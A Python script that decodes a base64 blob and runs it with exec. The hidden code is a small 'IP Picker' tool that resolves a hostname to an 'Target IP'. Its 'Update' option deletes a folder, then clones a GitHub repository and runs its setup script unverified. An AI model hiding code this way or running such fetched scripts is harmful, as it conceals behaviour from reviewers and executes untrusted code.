import base64
x = ( b'''IyMjIyMjIyMjX0xpYnJhcmllc18jIyMjIyMjIyMjIyMKaW1wb3J0IHNvY2tldApmcm9tIHRpbWUgaW1wb3J0IHNsZWVwIGFzIHNsZWVwCmZyb20gb3MgaW1wb3J0IHN5c3RlbSBhcyBzeXMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmRlZiB0b29sKCk6CiAgc3lzKCJjbGVhciIpCiAgc2xlZXAoMC4xKQogIHByaW50ICgiXDAzM1swOzM3bSBfICAgX19fX18gICAgICAgIF9fX19fICAgXyAgIF9fX19fICAgXyAgIF8gICAgX19fX18gICBfX19fXyAgICIpCiAgc2xlZXAoMC4xKQogIHByaW50ICgiXDAzM1sxOzMxbXwgfCB8ICBfICBcICAgICAgfCAgXyAgXCB8IHwgLyAgX19ffCB8IHwgLyAvICB8IF9fX198IHwgIF8gIFwgICIpCiAgc2xlZXAoMC4xKQogIHByaW50ICgiXDAzM1sxOzMybXwgfCB8IHxffCB8ICAgICAgfCB8X3wgfCB8IHwgfCB8ICAgICB8IHwvIC8gICB8IHxfXyAgIHwgfF98IHwgICIpCiAgc2xlZXAoMC4xKQogIHByaW50ICgiXDAzM1sxOzMzbXwgfCB8ICBfX18vICAgICAgfCAgX19fLyB8IHwgfCB8ICAgICB8IHxcIFwgICB8ICBfX3wgIHwgIF8gIC8gICIpCiAgc2xlZXAoMC4xKQogIHByaW50ICgiXDAzM1sxOzM2bXwgfCB8IHwgICAgICAgICAgfCB8ICAgICB8IHwgfCB8X19fICB8IHwgXCBcICB8IHxfX18gIHwgfCBcIFwgICIpCiAgc2xlZXAoMC4xKQogIHByaW50ICgiXDAzM1sxOzk0bXxffCB8X3wgICAgICAgICAgfF98ICAgICB8X3wgXF9fX19ffCB8X3wgIFxfXCB8X19fX198IHxffCAgXF9cICIpCiAgc2xlZXAoMC4xKQogIHByaW50ICgiIikKICBzbGVlcCgwLjEpCiAgcHJpbnQgKCJcMDMzWzE7OTFtICAJCQkJVmVyc2lvbj4+IDEuNSIpCiAgc2xlZXAoMC4xKQogIHByaW50ICgnXDAzM1swOzk2bUNvZGVkIEJ5IE1BU1RFUlgnKQogIHNsZWVwKDAuMSkKICBwcmludCAoIlwwMzNbMTs5MW0iKQogIHByaW50ICgiPT09PT09PT09PT09PT09PT09PT09PT09PT09PSgpIikKICBzbGVlcCgwLjEpCiAgcHJpbnQgKCI9IikKdG9vbCgpCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwpwcmludCAoIj1cMDMzWzE7OTFtMVwwMzNbMTs5NW19IFwwMzNbMTs5MW1VcGRhdGUgIikKc2xlZXAoMC4xKQpwcmludCAoIj0iKQpwcmludCAoIj1cMDMzWzE7OTFtMlwwMzNbMTs5NW19IFwwMzNbMTs5MW1QaWNrIElQIikKc2xlZXAoMC4xKQpwcmludCAoIj0iKQpubz1pbnB1dCgiPT09PT09PT1bQ2hvb3NlIGEgTnVtYmVyXT4gIikKaWYgbm8gPT0iMSI6CiAgc3lzKCJjZCAmJiBybSAtcmlmIElQLVBpY2tlciAmJiBnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL01hc3RlclhDb2RlL0lQLVBpY2tlciAmJiBjZCBJUC1QaWNrZXIgJiYgYmFzaCBzZXR1cC5zaCAmJiBweXRob24zIElQLnB5IikKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmVsaWYgbm8gPT0iMiI6CiAgdG9vbCgpCiAgcHJpbnQgKCI9IikKICBzbGVlcCgwLjEpCiAgcHJpbnQgKCI9XDAzM1sxOzk3bU5vdGU6IFdpdGhvdXQgKEhUVFAgb3IgSFRUUFMpIikKICBzbGVlcCgwLjEpCiAgcHJpbnQgKCI9IikKICBzbGVlcCgwLjEpCiAgaG9zdD1pbnB1dCgiPVwwMzNbMTs5M20kPT09PT1cMDMzWzE7OTZtW1wwMzNbMDs5MW1UeXBlIHlvdXIgRE5TXDAzM1sxOzk2bV1cMDMzWzE7OTNtPj5cMDMzWzA7OTZtICAiKQogIElQPXNvY2tldC5nZXRob3N0YnluYW1lKGhvc3QpCiAgcHJpbnQgKCIiKQogIHNsZWVwKDAuMSkKICBwcmludCAoIiBcMDMzWzE7OTBtPT09PT09PT09PT09PT09PT09PT09PT09PT0iLCAnXG4nLCIiLCdcbicgLCJcMDMzWzE7OTJtSG9zdG5hbWU+PiBcMDMzWzA7OTZtIiwgaG9zdCwgJ1xuJywiIiwnXG4nLCJcMDMzWzE7OTBtPT09PT09PT09PT09PT09PT09PT09PT09PT0iICwnXG4nLCIiLCdcbicsICJcMDMzWzE7OTJtVGFyZ2V0IElQPj4gXDAzM1swOzk2bSIsIElQICwgJ1xuJywiIiwnXG4nLCJcMDMzWzE7OTBtPT09PT09PT09PT09PT09PT09PT09PT09PT0iKQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMK''' )
exec (base64.b64decode(x))